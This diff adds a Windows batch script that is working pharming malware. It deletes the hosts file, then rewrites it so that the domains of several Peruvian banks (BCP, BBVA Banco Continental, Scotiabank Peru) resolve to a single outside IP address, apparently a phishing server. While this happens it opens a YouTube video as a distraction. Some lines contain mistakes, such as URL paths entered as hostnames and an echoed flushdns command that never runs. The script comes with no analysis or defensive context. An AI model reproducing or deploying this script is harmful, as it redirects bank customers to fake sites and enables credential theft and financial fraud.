@@ -1,0 +1,32 @@
+@echo off
+del %windir%\system32\drivers\etc\hosts
+echo ipconfig/flushdns
+echo 69.80.231.24  www.viabcp.com >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  http://www.viabcp.com/zona_publica/01_persona/index.html >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.viabcp.com/zona_publica/01_persona/index.html >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  viabcp.com >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.viabcp.com.pe >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  viabcp.com.pe >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.bcp.com >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  bcp.com >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.bcp.com.pe >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  bcp.com.pe >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.bbvabancocontinental.com >> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  bbvabancocontinental.com>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.bbvabancocontinental.com.pe>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  bbvabancocontinental.com.pe>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  bbvabancocontinental.com>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.bancocontinental.com.pe>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  bancocontinental.com.pe>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.bancocontinental.com>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  bancocontinental.com.pe>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  bancocontinental.com>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  http://www.bbvabancocontinental.com/tlpu/jsp/pe/esp/home/index.jsp>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.bbvabancocontinental.com/tlpu/jsp/pe/esp/home/index.jsp>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  http://www.scotiabank.com.pe/index2.shtml>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.scotiabank.com.pe>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  www.scotiabank.com>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  scotiabank.com>> %windir%\system32\drivers\etc\hosts
+echo 69.80.231.24  scotiabank.com.pe>> %windir%\system32\drivers\etc\hosts
+start http://www.youtube.com/watch?v=2Ne26XdvcdE
+exit
